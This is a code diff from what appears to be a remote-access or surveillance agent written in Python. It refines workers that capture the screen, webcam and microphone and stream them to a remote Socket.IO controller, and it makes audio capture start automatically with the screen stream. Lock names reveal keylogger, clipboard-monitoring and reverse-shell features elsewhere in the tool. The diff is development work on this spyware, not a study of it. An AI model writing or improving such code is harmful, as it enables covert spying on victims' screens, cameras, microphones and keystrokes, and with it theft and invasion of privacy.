@@ -495,16 +495,6 @@ except ImportError:
     PSUTIL_AVAILABLE = False
     log_message("psutil not available, system monitoring may not work", "warning")
 
-# Ultra-Low Latency Binary Protocol
-try:
-    import msgpack
-    MSGPACK_AVAILABLE = True
-    debug_print("[IMPORTS] ✅ msgpack imported (binary protocol)")
-except ImportError:
-    MSGPACK_AVAILABLE = False
-    debug_print("[IMPORTS] ⚠️ msgpack not available, falling back to JSON")
-    log_message("msgpack not available, install for 5-10x faster serialization: pip install msgpack", "warning")
-
 # Image processing imports
 try:
     from PIL import Image
@@ -667,9 +657,9 @@ STREAM_THREADS = []
 STREAM_THREAD = None
 capture_queue = None
 encode_queue = None
-TARGET_FPS = 50  # Optimized for 40-60 FPS range
-CAPTURE_QUEUE_SIZE = 10  # Increased for higher FPS
-ENCODE_QUEUE_SIZE = 10  # Increased for higher FPS
+TARGET_FPS = 20
+CAPTURE_QUEUE_SIZE = 10
+ENCODE_QUEUE_SIZE = 10
 
 # Audio streaming variables
 AUDIO_STREAMING_ENABLED = False
@@ -686,14 +676,47 @@ CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREADS = []
 camera_capture_queue = None
 camera_encode_queue = None
-CAMERA_CAPTURE_QUEUE_SIZE = 10  # Increased for higher FPS
-CAMERA_ENCODE_QUEUE_SIZE = 10  # Increased for higher FPS
-TARGET_CAMERA_FPS = 50  # Optimized for 40-60 FPS range
+CAMERA_CAPTURE_QUEUE_SIZE = 10
+CAMERA_ENCODE_QUEUE_SIZE = 10
+TARGET_CAMERA_FPS = 20
 
-# Ultra-Low Latency Streaming System
-ULTRA_LOW_LATENCY_ENABLED = True  # Enable optimized streaming
-PRE_INIT_SYSTEM = None  # Will be initialized at startup
-ULTRA_LOW_LATENCY_PIPELINE = None  # Main streaming pipeline
+# Thread safety locks for start/stop functions
+_stream_lock = threading.Lock()
+_audio_stream_lock = threading.Lock()
+_camera_stream_lock = threading.Lock()
+_keylogger_lock = threading.Lock()
+_clipboard_lock = threading.Lock()
+_reverse_shell_lock = threading.Lock()
+_voice_control_lock = threading.Lock()
+
+# Safe Socket.IO emit wrapper with connection checking
+def safe_emit(event_name, data, retry=False):
+    """
+    Thread-safe Socket.IO emit with connection checking.
+    
+    Args:
+        event_name: Event name to emit
+        data: Data to send
+        retry: If True, buffer failed emits for retry
+        
+    Returns:
+        bool: True if emit succeeded, False otherwise
+    """
+    if not SOCKETIO_AVAILABLE or sio is None:
+        return False
+    
+    if not sio.connected:
+        return False
+    
+    try:
+        sio.emit(event_name, data)
+        return True
+    except Exception as e:
+        error_msg = str(e)
+        # Silence connection errors
+        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+            log_message(f"Emit '{event_name}' failed: {e}", "warning")
+        return False
 
 # Other global variables
 CLIPBOARD_MONITOR_ENABLED = False
@@ -770,38 +793,29 @@ WEBRTC_CONFIG = {
     'adaptive_bitrate': True,
     'frame_dropping': True,
     'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 30, 'bitrate': 800000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 50, 'bitrate': 3000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 60, 'bitrate': 8000000},
-        'auto': {'adaptive': True, 'min_bitrate': 800000, 'max_bitrate': 15000000}
+        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
+        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
+        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
     },
     'performance_tuning': {
-        'keyframe_interval': 1,  # seconds - more frequent for faster recovery
+        'keyframe_interval': 2,  # seconds
         'disable_b_frames': True,
         'ultra_low_latency': True,
         'hardware_acceleration': True,
-        'gop_size': 50,  # frames at 50fps = 1 second (reduced for lower latency)
-        'max_bitrate_variance': 0.3,  # 30% variance allowed
-        'zero_latency_encoding': True,  # Enable zero-latency mode
-        'tune': 'zerolatency',  # x264/x265 zero-latency preset
+        'gop_size': 60,  # frames at 30fps = 2 seconds
+        'max_bitrate_variance': 0.3  # 30% variance allowed
     },
     'monitoring': {
         'connection_quality_metrics': True,
         'automatic_reconnection': True,
-        'detailed_logging': False,  # Disabled for performance
+        'detailed_logging': True,
         'stats_interval': 1000,  # ms
         'quality_thresholds': {
-            'min_bitrate': 500000,  # 500 kbps for higher FPS
-            'max_latency': 100,     # 100ms target (ultra-low latency)
-            'min_fps': 40           # Minimum 40 FPS target
+            'min_bitrate': 100000,  # 100 kbps
+            'max_latency': 1000,    # 1 second
+            'min_fps': 15
         }
-    },
-    'datachannel_config': {
-        # UDP-like behavior for minimal latency
-        'ordered': False,  # Don't guarantee order (like UDP)
-        'maxRetransmits': 0,  # No retransmissions (like UDP)
-        'maxPacketLifeTime': 100,  # Drop packets after 100ms
-        'protocol': 'udp-like',  # Custom identifier
     }
 }
 
@@ -820,8 +834,8 @@ PRODUCTION_SCALE = {
     },
     'performance_targets': {
         'target_latency': 100,                # 100ms target latency
-        'target_bitrate': 8000000,            # 8 Mbps target bitrate for higher FPS
-        'target_fps': 50,                     # 50 FPS target (40-60 range)
+        'target_bitrate': 5000000,            # 5 Mbps target bitrate
+        'target_fps': 30,                     # 30 FPS target
         'max_packet_loss': 0.01               # 1% max packet loss
     }
 }
@@ -932,7 +946,7 @@ def notify_controller_client_only(agent_id: str):
         if RUN_MODE == 'agent' and SOCKETIO_AVAILABLE and sio is not None:
             # If already connected, emit immediately; otherwise just log
             if hasattr(sio, 'connected') and sio.connected:
-                sio.emit('client_only', {'agent_id': agent_id, 'timestamp': time.time()})
+                safe_emit('client_only', {'agent_id': agent_id, 'timestamp': time.time()})  # ✅ SAFE
                 log_message("Notified controller: client-only mode")
             else:
                 log_message("Will notify controller (client-only) after connect")
@@ -4979,57 +4993,68 @@ def camera_capture_worker(agent_id):
         log_message("Error: OpenCV not available for camera capture", "error")
         return
     
+    cap = None
     try:
         # Try to open camera (try multiple indices)
-        cap = None
         for camera_index in range(3):  # Try cameras 0, 1, 2
             cap = cv2.VideoCapture(camera_index)
             if cap.isOpened():
                 log_message(f"Camera {camera_index} opened successfully")
                 break
             cap.release()
+            cap = None
         
         if not cap or not cap.isOpened():
             log_message("Error: Could not open any camera", "error")
             return
         
-        # Set camera properties for better performance
+        # Set camera properties for better performance and lower bandwidth
         cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
         cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
         cap.set(cv2.CAP_PROP_FPS, TARGET_CAMERA_FPS)
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimize buffer for lower latency
         
         frame_time = 1.0 / TARGET_CAMERA_FPS
         log_message("Camera capture started")
         
         while CAMERA_STREAMING_ENABLED:
-            start = time.time()
-            ret, frame = cap.read()
-            if not ret:
-                log_message("Failed to capture camera frame", "warning")
-                time.sleep(0.1)
-                continue
-            
-            # Put in queue, drop oldest if full
             try:
-                camera_capture_queue.put_nowait(frame)
-            except queue.Full:
-                try:
-                    camera_capture_queue.get_nowait()  # Remove oldest
-                    camera_capture_queue.put_nowait(frame)  # Add new
-                except queue.Empty:
+                start = time.time()
+                ret, frame = cap.read()
+                if not ret:
+                    log_message("Failed to capture camera frame", "warning")
+                    time.sleep(0.1)
+                    continue
+                
+                # Put in queue, skip frame if queue is too full (adaptive frame dropping)
+                queue_size = camera_capture_queue.qsize()
+                if queue_size < CAMERA_CAPTURE_QUEUE_SIZE:
+                    # Queue has space, add frame
+                    try:
+                        camera_capture_queue.put_nowait(frame)
+                    except queue.Full:
+                        pass  # Skip this frame if queue filled up
+                else:
+                    # Queue is full, skip this frame to prevent backlog
                     pass
-            
-            # Frame rate limiting
-            elapsed = time.time() - start
-            sleep_time = max(0, frame_time - elapsed)
-            if sleep_time > 0:
-                time.sleep(sleep_time)
+                
+                # Frame rate limiting
+                elapsed = time.time() - start
+                sleep_time = max(0, frame_time - elapsed)
+                if sleep_time > 0:
+                    time.sleep(sleep_time)
+            except KeyboardInterrupt:
+                log_message("Camera capture worker interrupted")
+                break
         
-        cap.release()
-        log_message("Camera capture stopped")
-        
+    except KeyboardInterrupt:
+        log_message("Camera capture worker interrupted")
     except Exception as e:
         log_message(f"Camera capture error: {e}")
+    finally:
+        if cap:
+            cap.release()
+        log_message("Camera capture stopped")
 
 def camera_encode_worker(agent_id):
     """Encode camera frames from capture queue to H.264 and put in encode queue."""
@@ -5039,41 +5064,55 @@ def camera_encode_worker(agent_id):
         log_message("Error: OpenCV not available for camera encoding", "error")
         return
     
-    while CAMERA_STREAMING_ENABLED:
-        try:
-            # Get frame from capture queue
+    try:
+        while CAMERA_STREAMING_ENABLED:
             try:
-                frame = camera_capture_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
-            try:
-                # For now, use JPEG encoding (can be upgraded to H.264 later)
-                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
-                result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
-                if result:
-                    encoded_data = encoded_frame.tobytes()
-                    
-                    # Put in encode queue, drop oldest if full
-                    try:
-                        camera_encode_queue.put_nowait(encoded_data)
-                    except queue.Full:
-                        try:
-                            camera_encode_queue.get_nowait()  # Remove oldest
-                            camera_encode_queue.put_nowait(encoded_data)  # Add new
-                        except queue.Empty:
-                            pass
-                else:
-                    log_message("Failed to encode camera frame", "warning")
-                    
-            except Exception as e:
-                log_message(f"Camera encoding error: {e}")
-                time.sleep(0.01)
+                # Get frame from capture queue
+                try:
+                    frame = camera_capture_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
                 
-        except Exception as e:
-            log_message(f"Camera encoding worker error: {e}")
-            time.sleep(0.01)
+                # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
+                try:
+                    # Dynamic JPEG quality based on queue fullness
+                    queue_fullness = camera_encode_queue.qsize() / CAMERA_ENCODE_QUEUE_SIZE
+                    if queue_fullness > 0.8:
+                        jpeg_quality = 50  # Low quality when queue is full
+                    elif queue_fullness > 0.5:
+                        jpeg_quality = 60  # Medium quality
+                    else:
+                        jpeg_quality = 65  # Good quality when queue is empty
+                    
+                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
+                    result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
+                    if result:
+                        encoded_data = encoded_frame.tobytes()
+                        
+                        # Put in encode queue, drop oldest if full
+                        try:
+                            camera_encode_queue.put_nowait(encoded_data)
+                        except queue.Full:
+                            try:
+                                camera_encode_queue.get_nowait()  # Remove oldest
+                                camera_encode_queue.put_nowait(encoded_data)  # Add new
+                            except queue.Empty:
+                                pass
+                    else:
+                        log_message("Failed to encode camera frame", "warning")
+                        
+                except Exception as e:
+                    log_message(f"Camera encoding error: {e}")
+                    time.sleep(0.1)
+                    
+            except KeyboardInterrupt:
+                log_message("Camera encode worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Camera encoding worker error: {e}")
+                time.sleep(0.1)
+    except KeyboardInterrupt:
+        log_message("Camera encode worker interrupted")
     
     log_message("Camera encoding stopped")
 
@@ -5085,42 +5124,97 @@ def camera_send_worker(agent_id):
         log_message("Error: socket.io not available for camera sending", "error")
         return
     
-    while CAMERA_STREAMING_ENABLED:
-        try:
-            # Get encoded data from encode queue
+    # Track last log time to avoid spam
+    last_disconnect_log_time = 0.0
+    
+    # FPS and bandwidth tracking
+    frame_count = 0
+    bytes_sent = 0
+    start_time = time.time()
+    last_stats_time = start_time
+    
+    # Bandwidth limit: 5 MB/s (instead of 16 MB/s)
+    max_bytes_per_second = 5 * 1024 * 1024
+    bytes_this_second = 0
+    second_start = time.time()
+    
+    try:
+        while CAMERA_STREAMING_ENABLED:
             try:
-                encoded_data = camera_encode_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Send via socket.io - encode as base64 data URL for browser display
-            try:
-                # Check if socket.io is connected before sending
-                if not sio or not hasattr(sio, 'connected') or not sio.connected:
-                    time.sleep(0.1)  # Wait for connection
+                # Get encoded data from encode queue
+                try:
+                    encoded_data = camera_encode_queue.get(timeout=0.5)
+                except queue.Empty:
                     continue
                 
-                # If already a data URL string, send as-is
-                if isinstance(encoded_data, str) and encoded_data.startswith('data:'):
-                    frame_data_url = encoded_data
-                else:
-                    # Encode bytes as base64 data URL
-                    frame_b64 = base64.b64encode(encoded_data).decode('utf-8')
-                    frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
+                # Check if socket is connected before sending
+                if not sio.connected:
+                    # Throttle disconnect log messages
+                    now = time.time()
+                    if now >= last_disconnect_log_time + 5.0:
+                        log_message("Socket.IO disconnected, deferring camera frames", "warning")
+                        last_disconnect_log_time = now
+                    time.sleep(0.5)
+                    continue
                 
-                sio.emit('camera_frame', {
-                    'agent_id': agent_id,
-                    'frame': frame_data_url
-                })
+                # Send via socket.io - encode as base64 data URL for browser display
+                try:
+                    # If already a data URL string, send as-is
+                    if isinstance(encoded_data, str) and encoded_data.startswith('data:'):
+                        frame_data_url = encoded_data
+                    else:
+                        # Encode bytes as base64 data URL
+                        frame_b64 = base64.b64encode(encoded_data).decode('utf-8')
+                        frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
+                    
+                    safe_emit('camera_frame', {
+                        'agent_id': agent_id,
+                        'frame': frame_data_url
+                    })
+                    
+                    # Track bandwidth and FPS
+                    frame_size = len(encoded_data)
+                    bytes_sent += frame_size
+                    bytes_this_second += frame_size
+                    frame_count += 1
+                    
+                    # Check if we've exceeded bandwidth limit this second
+                    now = time.time()
+                    if now - second_start >= 1.0:
+                        # New second, reset counter
+                        bytes_this_second = 0
+                        second_start = now
+                    elif bytes_this_second >= max_bytes_per_second:
+                        # Hit bandwidth limit, sleep until next second
+                        sleep_time = 1.0 - (now - second_start)
+                        if sleep_time > 0:
+                            time.sleep(sleep_time)
+                        bytes_this_second = 0
+                        second_start = time.time()
+                    
+                    # Log stats every 5 seconds
+                    if now - last_stats_time >= 5.0:
+                        elapsed = now - start_time
+                        fps = frame_count / elapsed if elapsed > 0 else 0
+                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
+                        log_message(f"Camera stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} frames total")
+                        last_stats_time = now
+                    
+                except Exception as e:
+                    error_msg = str(e)
+                    # Silence "not a connected namespace" errors
+                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                        log_message(f"Camera send error: {e}")
+                    time.sleep(0.1)
+                    
+            except KeyboardInterrupt:
+                log_message("Camera send worker interrupted")
+                break
             except Exception as e:
-                # Only log namespace errors once every 5 seconds
-                if "not a connected namespace" not in str(e):
-                    log_message(f"Camera send error: {e}")
+                log_message(f"Camera sending error: {e}")
                 time.sleep(0.1)
-                
-        except Exception as e:
-            log_message(f"Camera sending error: {e}")
-            time.sleep(0.01)
+    except KeyboardInterrupt:
+        log_message("Camera send worker interrupted")
     
     log_message("Camera sending stopped")
 
@@ -5166,6 +5260,8 @@ def audio_capture_worker(agent_id):
         log_message("Error: Audio capture queue not initialized", "error")
         return
     
+    p = None
+    stream = None
     try:
         p = pyaudio.PyAudio()
         
@@ -5208,17 +5304,24 @@ def audio_capture_worker(agent_id):
                         pass
                 
                 time.sleep(0.02)  # 20ms for 50 FPS
+            except KeyboardInterrupt:
+                log_message("Audio capture worker interrupted")
+                break
             except Exception as e:
                 log_message(f"Audio capture error: {e}")
                 break
         
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        log_message("Audio capture stopped")
-        
+    except KeyboardInterrupt:
+        log_message("Audio capture worker interrupted")
     except Exception as e:
         log_message(f"Audio capture initialization error: {e}")
+    finally:
+        if stream:
+            stream.stop_stream()
+            stream.close()
+        if p:
+            p.terminate()
+        log_message("Audio capture stopped")
 
 def audio_encode_worker(agent_id):
     """Encode audio frames from capture queue to Opus and put in encode queue."""
@@ -5228,67 +5331,62 @@ def audio_encode_worker(agent_id):
         log_message("Error: Audio queues not initialized", "error")
         return
     
-    # Determine encoding format
-    use_opus = False
-    encoder = None
-    
     try:
         import opuslib
         # Create Opus encoder (48kHz, mono, 20ms frame size)
         encoder = opuslib.Encoder(48000, 1, opuslib.APPLICATION_AUDIO)
         encoder.bitrate = 64000  # 64 kbps for good quality
-        use_opus = True
         log_message("Opus encoder initialized")
     except ImportError:
         log_message("Warning: opuslib not available, using PCM", "warning")
-        use_opus = False
+        encoder = None
     except Exception as e:
-        log_message(f"Error initializing Opus encoder: {e}, using PCM fallback")
-        use_opus = False
+        log_message(f"Error initializing Opus encoder: {e}")
+        encoder = None
     
-    while AUDIO_STREAMING_ENABLED:
-        try:
-            # Get audio data from capture queue
+    try:
+        while AUDIO_STREAMING_ENABLED:
             try:
-                pcm_data = audio_capture_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Encode with Opus if available, otherwise use PCM
-            audio_format = 'pcm'  # Default format
-            
-            if use_opus and encoder:
+                # Get audio data from capture queue
                 try:
-                    # Convert PCM to Opus
-                    if not NUMPY_AVAILABLE:
-                        log_message("NumPy not available for audio processing", "warning")
-                        encoded_data = pcm_data  # Fallback to PCM
-                        audio_format = 'pcm'
-                    else:
+                    pcm_data = audio_capture_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                
+                # Encode with Opus if available, otherwise use PCM
+                if encoder:
+                    try:
+                        # Convert PCM to Opus
+                        if not NUMPY_AVAILABLE:
+                            log_message("NumPy not available for audio processing", "warning")
+                            encoded_data = pcm_data  # Fallback to PCM
+                            continue
                         pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
                         encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
-                        audio_format = 'opus'
-                except Exception as e:
-                    log_message(f"Opus encoding error: {e}, falling back to PCM")
-                    encoded_data = pcm_data  # Fallback to PCM
-                    audio_format = 'pcm'
-            else:
-                encoded_data = pcm_data  # Use PCM
-                audio_format = 'pcm'
-            
-            # Put in encode queue with format indicator
-            try:
-                audio_encode_queue.put_nowait((encoded_data, audio_format))
-            except queue.Full:
+                    except Exception as e:
+                        log_message(f"Opus encoding error: {e}")
+                        encoded_data = pcm_data  # Fallback to PCM
+                else:
+                    encoded_data = pcm_data  # Use PCM
+                
+                # Put in encode queue, drop oldest if full
                 try:
-                    audio_encode_queue.get_nowait()  # Remove oldest
-                    audio_encode_queue.put_nowait((encoded_data, audio_format))  # Add new
-                except queue.Empty:
-                    pass
-                    
-        except Exception as e:
-            log_message(f"Audio encoding error: {e}")
-            time.sleep(0.01)
+                    audio_encode_queue.put_nowait(encoded_data)
+                except queue.Full:
+                    try:
+                        audio_encode_queue.get_nowait()  # Remove oldest
+                        audio_encode_queue.put_nowait(encoded_data)  # Add new
+                    except queue.Empty:
+                        pass
+                        
+            except KeyboardInterrupt:
+                log_message("Audio encode worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Audio encoding error: {e}")
+                time.sleep(0.1)
+    except KeyboardInterrupt:
+        log_message("Audio encode worker interrupted")
     
     log_message("Audio encoding stopped")
 
@@ -5304,65 +5402,78 @@ def audio_send_worker(agent_id):
         log_message("Error: Audio encode queue not initialized", "error")
         return
     
-    while AUDIO_STREAMING_ENABLED:
-        try:
-            # Get encoded data and format from encode queue
+    # Track last log time to avoid spam
+    last_disconnect_log_time = 0.0
+    
+    try:
+        while AUDIO_STREAMING_ENABLED:
             try:
-                queue_item = audio_encode_queue.get(timeout=0.1)
-                # Handle both tuple (encoded_data, format) and raw data for backward compatibility
-                if isinstance(queue_item, tuple):
-                    encoded_data, audio_format = queue_item
-                else:
-                    encoded_data = queue_item
-                    audio_format = 'pcm'  # Default to PCM
-            except queue.Empty:
-                continue
-            
-            # Base64 encode audio data for transmission over socket.io
-            try:
-                # Check if socket.io is connected before sending
-                if not sio or not hasattr(sio, 'connected') or not sio.connected:
-                    time.sleep(0.1)  # Wait for connection
+                # Get encoded data from encode queue
+                try:
+                    encoded_data = audio_encode_queue.get(timeout=0.5)
+                except queue.Empty:
                     continue
                 
-                import base64
-                # Encode binary audio data to base64 string
-                audio_b64 = base64.b64encode(encoded_data).decode('utf-8')
+                # Check if socket is connected before sending
+                if not sio.connected:
+                    # Throttle disconnect log messages
+                    now = time.time()
+                    if now >= last_disconnect_log_time + 5.0:
+                        log_message("Socket.IO disconnected, deferring audio frames", "warning")
+                        last_disconnect_log_time = now
+                    time.sleep(0.5)
+                    continue
                 
-                # Send via socket.io with base64 encoded data and format
-                sio.emit('audio_frame', {
-                    'agent_id': agent_id,
-                    'frame': audio_b64,
-                    'format': audio_format,  # Send actual format (pcm or opus)
-                    'sample_rate': RATE,
-                    'channels': CHANNELS
-                })
+                # Send via socket.io (binary data is automatically detected)
+                try:
+                    safe_emit('audio_frame', {
+                        'agent_id': agent_id,
+                        'frame': encoded_data
+                    })
+                except Exception as e:
+                    error_msg = str(e)
+                    # Silence "not a connected namespace" errors
+                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                        log_message(f"Audio send error: {e}")
+                    time.sleep(0.1)
+                    
+            except KeyboardInterrupt:
+                log_message("Audio send worker interrupted")
+                break
             except Exception as e:
-                # Only log non-namespace errors
-                if "not a connected namespace" not in str(e):
-                    log_message(f"Audio send error: {e}")
+                log_message(f"Audio sending error: {e}")
                 time.sleep(0.1)
-                
-        except Exception as e:
-            log_message(f"Audio sending error: {e}")
-            time.sleep(0.01)
+    except KeyboardInterrupt:
+        log_message("Audio send worker interrupted")
     
     log_message("Audio sending stopped")
 
 # stream_screen_h264_socketio() is defined later after worker functions (line ~11851)
 
 def _run_screen_stream(agent_id):
-    """Thread target for screen streaming with robust fallbacks.
-    Tries WebRTC-or-socket chooser if available; otherwise runs a simple Socket.IO stream.
+    """Thread target for screen streaming - uses optimized multi-threaded pipeline.
+    
+    Uses globals() lookup at runtime to find functions defined later in the file.
     """
-    chooser = globals().get("stream_screen_webrtc_or_socketio")
-    h264_socket = globals().get("stream_screen_h264_socketio")
+    # Look up functions at runtime (after module has loaded)
+    # This MUST use globals() because the functions are defined later in the file
+    import sys
+    current_module = sys.modules[__name__]
+    
+    # Try to get the chooser function (defined at line ~12426)
+    chooser = getattr(current_module, 'stream_screen_webrtc_or_socketio', None)
     if callable(chooser):
+        log_message("[STREAM] Using optimized WebRTC/Socket.IO chooser")
         return chooser(agent_id)
+    
+    # Fallback to h264 socket.io (defined at line ~12406)
+    h264_socket = getattr(current_module, 'stream_screen_h264_socketio', None)
     if callable(h264_socket):
+        log_message("[STREAM] Using optimized H.264 Socket.IO pipeline")
         return h264_socket(agent_id)
-    # Final fallback that works even during early initialization
-    log_message("Using simple Socket.IO screen stream (compat mode)")
+    
+    # Final fallback to simple stream
+    log_message("[STREAM] Using simple Socket.IO stream (compat mode)")
     return stream_screen_simple_socketio(agent_id)
 
 def stream_screen_simple_socketio(agent_id):
@@ -5396,94 +5507,116 @@ def stream_screen_simple_socketio(agent_id):
             frame_time = 1.0 / max(1, int(TARGET_FPS) if 'TARGET_FPS' in globals() else 15)
             log_message("Started simple Socket.IO screen stream (compat mode).")
             next_not_connected_log_time = 0.0
-            while STREAMING_ENABLED:
-                start_ts = time.time()
-                sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
-                img = np.array(sct_img)
-                if img.shape[1] != width or img.shape[0] != height:
-                    img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
-                if img.shape[2] == 4:
-                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
-                if ok:
-                    connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
-                    if not connected:
-                        # Throttle log to avoid spam until socket connects
-                        now = time.time()
-                        if now >= next_not_connected_log_time:
-                            log_message("Socket.IO not connected; deferring screen frames")
-                            next_not_connected_log_time = now + 5.0
-                    else:
-                        try:
-                            b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
-                            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
-                        except Exception as send_err:
-                            # Silence namespace/connection race errors and retry on next loop
-                            msg = str(send_err)
-                            if "not a connected namespace" in msg or "Connection is closed" in msg:
-                                pass
+            
+            try:
+                while STREAMING_ENABLED:
+                    try:
+                        start_ts = time.time()
+                        sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
+                        img = np.array(sct_img)
+                        if img.shape[1] != width or img.shape[0] != height:
+                            img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+                        if img.shape[2] == 4:
+                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                        if ok:
+                            connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
+                            if not connected:
+                                # Throttle log to avoid spam until socket connects
+                                now = time.time()
+                                if now >= next_not_connected_log_time:
+                                    log_message("Socket.IO not connected; deferring screen frames")
+                                    next_not_connected_log_time = now + 5.0
                             else:
-                                log_message(f"Simple stream send error: {send_err}")
-                # FPS pacing
-                elapsed = time.time() - start_ts
-                sleep_for = frame_time - elapsed
-                if sleep_for > 0:
-                    time.sleep(sleep_for)
+                                try:
+                                    b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
+                                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
+                                except Exception as send_err:
+                                    # Silence namespace/connection race errors and retry on next loop
+                                    msg = str(send_err)
+                                    if "not a connected namespace" in msg or "Connection is closed" in msg:
+                                        pass
+                                    else:
+                                        log_message(f"Simple stream send error: {send_err}")
+                        # FPS pacing
+                        elapsed = time.time() - start_ts
+                        sleep_for = frame_time - elapsed
+                        if sleep_for > 0:
+                            time.sleep(sleep_for)
+                    except KeyboardInterrupt:
+                        log_message("Screen stream interrupted")
+                        break
+            except KeyboardInterrupt:
+                log_message("Screen stream interrupted")
+            
             return True
+    except KeyboardInterrupt:
+        log_message("Screen stream interrupted")
+        return False
     except Exception as e:
         log_message(f"Simple screen streaming error: {e}", "error")
         return False
 
 def start_streaming(agent_id):
-    global STREAMING_ENABLED, STREAM_THREAD, ULTRA_LOW_LATENCY_PIPELINE, PRE_INIT_SYSTEM, ULTRA_LOW_LATENCY_ENABLED
+    global STREAMING_ENABLED, STREAM_THREAD
     
-    if not STREAMING_ENABLED:
+    with _stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if STREAMING_ENABLED:
+            log_message("Screen streaming already running", "warning")
+            return
+        
         STREAMING_ENABLED = True
-        
-        # Try ultra-low latency pipeline first (if initialized)
-        if ULTRA_LOW_LATENCY_ENABLED and PRE_INIT_SYSTEM is not None and PRE_INIT_SYSTEM.is_ready:
-            try:
-                log_message("🚀 Using Ultra-Low Latency Pipeline (50-100ms latency)")
-                
-                # Import and create pipeline if not already created
-                if not ULTRA_LOW_LATENCY_PIPELINE:
-                    from ultra_low_latency import UltraLowLatencyStreamingPipeline
-                    ULTRA_LOW_LATENCY_PIPELINE = UltraLowLatencyStreamingPipeline(agent_id)
-                    ULTRA_LOW_LATENCY_PIPELINE.sio = sio  # Give it socket.io access
-                
-                # Start the pipeline
-                ULTRA_LOW_LATENCY_PIPELINE.start()
-                log_message("✅ Ultra-Low Latency streaming started")
-                return
-            except Exception as e:
-                log_message(f"⚠️ Ultra-low latency failed: {e}, falling back to standard", "warning")
-                ULTRA_LOW_LATENCY_PIPELINE = None
-        
-        # Fallback to standard streaming
+        # Use a safe wrapper that defers until functions are defined
         STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
-        log_message("Started standard video streaming (fallback mode).")
+        log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
+        
+        # ✅ AUTO-START AUDIO: Start audio streaming with screen stream
+        log_message("🎤 Auto-starting audio streaming with screen stream...")
+        start_audio_streaming(agent_id)
 
 def stop_streaming():
-    global STREAMING_ENABLED, STREAM_THREAD, ULTRA_LOW_LATENCY_PIPELINE
-    if STREAMING_ENABLED:
+    global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
+    
+    with _stream_lock:  # ✅ THREAD-SAFE
+        if not STREAMING_ENABLED:
+            return
+        
         STREAMING_ENABLED = False
         
-        # Stop ultra-low latency pipeline if active
-        if ULTRA_LOW_LATENCY_PIPELINE:
-            try:
-                ULTRA_LOW_LATENCY_PIPELINE.stop()
-                log_message("✅ Ultra-Low Latency streaming stopped")
-            except Exception as e:
-                log_message(f"Error stopping ultra-low latency: {e}")
-            ULTRA_LOW_LATENCY_PIPELINE = None
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if capture_queue:
+                while not capture_queue.empty():
+                    try:
+                        capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
         
-        # Stop standard streaming thread
-        if STREAM_THREAD:
-            STREAM_THREAD.join(timeout=2)
+        try:
+            if encode_queue:
+                while not encode_queue.empty():
+                    try:
+                        encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         STREAM_THREAD = None
+        STREAM_THREADS = []
+        capture_queue = None
+        encode_queue = None
         log_message("Stopped video stream.")
+        
+        # ✅ AUTO-STOP AUDIO: Stop audio streaming with screen stream
